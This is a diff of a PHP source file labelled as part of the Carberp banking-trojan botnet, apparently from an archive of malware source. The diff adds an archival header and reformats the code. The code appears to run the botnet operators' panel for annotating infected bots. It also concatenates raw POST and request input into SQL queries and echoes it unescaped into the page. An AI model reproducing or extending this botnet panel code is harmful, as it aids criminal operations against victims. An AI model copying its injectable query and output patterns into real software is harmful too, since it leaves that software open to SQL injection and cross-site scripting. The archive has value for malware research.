@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 
@@ -8,7 +19,8 @@ if(!empty($Cur['str']) && !empty($Cur['x'])){
 		$uid = '0' . $matches[1];
 	}
 
-	if(!empty($prefix) && !empty($uid)){		if($Cur['x'] == 'ibnkgra'){
+	if(!empty($prefix) && !empty($uid)){
+		if($Cur['x'] == 'ibnkgra'){
 			if(!empty($Cur['y'])){
 				$comment = $mysqli->query('SELECT id,prefix,uid FROM bf_comments WHERE (prefix=\''.$prefix.'\') AND (uid=\''.$uid.'\') AND (type=\'ibnkgra\') AND (uniq=\''.$Cur['y'].'\') LIMIT 1');
 				
@@ -27,12 +39,16 @@ if(!empty($Cur['str']) && !empty($Cur['x'])){
 				
 				if(empty($_POST['text'])){
 					$_POST['text'] = ' ';
-				}else{					if(strpos($_POST['text'], '!') != 0){						print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'red\';</script>');
-					}else{						print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'\';</script>');
+				}else{
+					if(strpos($_POST['text'], '!') != 0){
+						print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'red\';</script>');
+					}else{
+						print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'\';</script>');
 					}
 				}
 				print($_POST['text']);
-			}else{				exit;
+			}else{
+				exit;
 			}
 		}else{
 			$comment = $mysqli->query('SELECT id,prefix,uid FROM bf_comments WHERE (prefix=\''.$prefix.'\') AND (uid=\''.$uid.'\') AND (type=\''.$Cur['x'].'\') LIMIT 1');
@@ -50,14 +66,19 @@ if(!empty($Cur['str']) && !empty($Cur['x'])){
 				if(!empty($_POST['text'])) $mysqli->query("INSERT INTO bf_comments (prefix, uid, comment, type, post_id) VALUES ('".$prefix."', '".$uid."', '".$_POST['text']."', '".$Cur['x']."', '".$_SESSION['user']->id."')");
 			}
 
-			if(empty($_POST['text'])){				$_POST['text'] = ' ';
-			}else{				if(strpos($_POST['text'], '!') != 0){					print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'red\';</script>');
-				}else{					print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'\';</script>');
+			if(empty($_POST['text'])){
+				$_POST['text'] = ' ';
+			}else{
+				if(strpos($_POST['text'], '!') != 0){
+					print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'red\';</script>');
+				}else{
+					print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$comment->prefix.$comment->uid.'\').style.color = \'\';</script>');
 				}
 			}
 			print($_POST['text']);
 		}
-	}else{		exit;
+	}else{
+		exit;
 	}
 }
 
